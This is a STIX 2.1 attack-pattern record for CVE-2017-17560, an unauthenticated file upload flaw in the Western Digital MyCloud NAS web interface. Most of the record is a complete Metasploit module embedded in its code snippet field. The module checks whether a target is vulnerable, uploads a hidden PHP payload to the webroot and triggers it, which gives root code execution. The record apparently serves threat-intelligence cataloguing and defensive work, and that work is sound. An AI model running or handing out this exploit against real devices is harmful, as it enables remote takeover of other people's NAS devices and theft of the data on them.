{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4ee7fa89-80cc-440d-9f2d-e59835b78d9e",
    "created": "2024-08-14T17:01:46.608768Z",
    "modified": "2024-08-14T17:01:46.608772Z",
    "name": "Western Digital MyCloud multi_uploadify File Upload Vulnerability",
    "description": " This module exploits a file upload vulnerability found in Western Digital's MyCloud NAS web administration HTTP service. The /web/jquery/uploader/multi_uploadify.php PHP script provides multipart upload functionality that is accessible without authentication and can be used to place a file anywhere on the device's file system. This allows an attacker the ability to upload a PHP shell onto the device and obtain arbitrary code execution as root.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/wd_mycloud_multiupload_upload.rb",
            "external_id": "wd_mycloud_multiupload_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.exploitee.rs/index.php/Western_Digital_MyCloud#.2Fjquery.2Fuploader.2Fmulti_uploadify.php_.28added_08.2F06.2F2017.29"
        },
        {
            "source_name": "reference",
            "url": "https://download.exploitee.rs/file/generic/Exploiteers-DEFCON25.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=EO_49pfmA5A"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-17560"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  HttpFingerprint = { :method => 'HEAD', :uri => '/web/', :pattern => [/Apache/] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Western Digital MyCloud multi_uploadify File Upload Vulnerability',\n      'Description'    => %q{\n        This module exploits a file upload vulnerability found in Western Digital's MyCloud\n        NAS web administration HTTP service. The /web/jquery/uploader/multi_uploadify.php\n        PHP script provides multipart upload functionality that is accessible without authentication\n        and can be used to place a file anywhere on the device's file system. This allows an\n        attacker the ability to upload a PHP shell onto the device and obtain arbitrary code\n        execution as root.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Zenofex <zenofex[at]exploitee.rs>' # Initial vulnerability discovery, PoC, and Metasploit module\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://www.exploitee.rs/index.php/Western_Digital_MyCloud#.2Fjquery.2Fuploader.2Fmulti_uploadify.php_.28added_08.2F06.2F2017.29'],\n          ['URL', 'https://download.exploitee.rs/file/generic/Exploiteers-DEFCON25.pdf'],\n          ['URL', 'https://www.youtube.com/watch?v=EO_49pfmA5A'],\n          ['CVE', '2017-17560']\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-07-29',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    res = send_request_cgi('uri' => '/web/jquery/uploader/multi_uploadify.php')\n\n    if res.nil?\n      vprint_error('Connection failed')\n      return CheckCode::Unknown\n    end\n\n    if res.code == 302 && res.headers['Location'] =~ /\\?status=1/\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Safe\n  end\n\n  def upload(web_folder, fname, file)\n    # construct post data\n    data = Rex::MIME::Message.new\n    data.add_part(file, 'application/x-php', nil, \"form-data; name=\\\"Filedata[]\\\"; filename=\\\"#{fname}\\\"\")\n\n    # upload\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => '/web/jquery/uploader/multi_uploadify.php',\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => data.to_s,\n      'vars_get' => {\n        'folder' => web_folder\n      }\n    })\n  end\n\n  def exploit\n    if check != CheckCode::Vulnerable\n      fail_with(Failure::NotVulnerable, 'Target does not appear to be a vulnerable Western Digital MyCloud device')\n    end\n\n    # upload PHP payload to '/var/www' (webroot).\n    web_folder = '/var/www'\n    php   = \"<?php #{payload.encoded} ?>\"\n    print_status(\"Uploading PHP payload (#{php.length} bytes) to '#{web_folder}'.\")\n    fname = \".#{rand_text_alphanumeric(rand(10) + 6)}.php\"\n\n    res = upload(web_folder, fname, php)\n\n    # check upload response\n    fail_with(Failure::Unreachable, 'No response received from the target.') unless res\n    if res.code != 302 || res.headers['Location'] =~ /\\?status=0/\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply (#{res.body.length} bytes)\")\n    end\n    print_good('Uploaded PHP payload successfully.')\n\n    # register uploaded php payload file for cleanup\n    register_files_for_cleanup(fname)\n\n    # retrieve and execute PHP payload\n    print_status(\"Making request for '/#{fname}' to execute payload.\")\n    res = send_request_cgi({'uri' => normalize_uri(fname)}, 15)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2017-07-29",
    "x_mitre_platforms": [
        "php'"
    ]
}